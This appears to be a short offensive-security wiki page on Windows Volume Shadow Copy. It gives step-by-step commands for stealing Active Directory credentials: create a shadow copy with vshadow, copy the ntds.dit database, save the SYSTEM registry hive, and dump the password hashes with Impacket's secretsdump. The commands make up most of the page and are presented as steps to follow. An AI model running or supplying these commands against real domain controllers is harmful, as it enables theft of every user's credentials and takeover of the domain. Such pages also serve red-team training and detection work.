# Shadow Copy

**Shadow Copy** **A.K.A Volume Shadow Copy Service (VSS)** in Windows is a feature that creates backup snapshots of files or entire volumes while they are in use. \
Originally designed for quick backups and to enable file versioning in case of accidental deletion or data corruption.

Attackers often leverage this feature to access sensitive files, like the NTDS database, which contains user credentials, without alerting security systems.

{% hint style="warning" %}
**Note:** shadow copy requires Administrative or SYSTEM Privileges
{% endhint %}

#### **Steps for shadow copy:**

1. Create a Shadow Copy.

```batch
vshadow.exe -nw -p  C:
```

2. Copy **ntds.dit** file.

```batch
copy <shadow_path>\windows\ntds\ntds.dit c:\ntds.dit.bak
```

3. Export the SYSTEM Hive - necessary for decrypting NTDS hashes.

```batch
reg save hklm\system c:\system.bak
```

3. Extract hashes Finally using Impacket’s secretsdump.

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```



